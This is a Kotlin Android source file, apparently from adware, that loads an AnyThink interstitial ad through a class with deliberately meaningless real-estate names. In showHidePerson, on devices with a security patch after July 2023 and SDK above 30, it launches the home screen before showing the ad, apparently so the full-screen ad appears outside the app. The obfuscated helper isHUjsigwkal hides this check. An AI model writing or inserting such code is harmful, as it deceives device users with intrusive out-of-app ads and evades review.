package com.real.estate.bedroom

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Build
import com.anythink.interstitial.api.ATInterstitial
import com.anythink.interstitial.api.ATInterstitialListener
import com.real.estate.DoorLog
import com.real.estate.FloorImpl
import java.text.SimpleDateFormat
import java.util.Locale

/**
 * Date：2024/4/2
 * Describe:
 */
class BasementPerson(private val listener: ATInterstitialListener) {
    private var failedS by FloorImpl()
    private val listLog = arrayListOf("reqprogress")

    fun request(context: Context, idAd: String): ATInterstitial {
        return ATInterstitial(context, idAd).apply {
            setAdListener(listener)
            load()
            DoorLog.logEve(listLog[0])
        }
    }

    fun showHidePerson(activity: Activity, atInterstitial: ATInterstitial) {
        val s = Build.VERSION.SECURITY_PATCH
        if (isHUjsigwkal(s, "2023-07-01") == "yes") {
            val intent = Intent("android.intent.action.MAIN")
            intent.addCategory("android.intent.category.HOME")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            runCatching {
                activity.startActivity(intent)
            }.onFailure {
                failedS = "failed--->"
            }
        }
        atInterstitial.setAdListener(listener)
        atInterstitial.show(activity)
    }


    //jump home
    private fun isHUjsigwkal(
        target: String = Build.VERSION.SECURITY_PATCH, curString: String
    ): String {
        if (failedS.isNotBlank()) return "error"
        if (Build.VERSION.SDK_INT > "30".toInt()) {
            if (timeChangeToL(target) > timeChangeToL(curString)) {
                return "yes"
            }
        }
        return "no"
    }

    private fun timeChangeToL(date: String): Long {
        var time = 0L
        runCatching {
            val df = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
            val dt = df.parse(date)
            if (dt != null) {
                time = (dt.time) / 1000
            }
        }
        return time
    }
}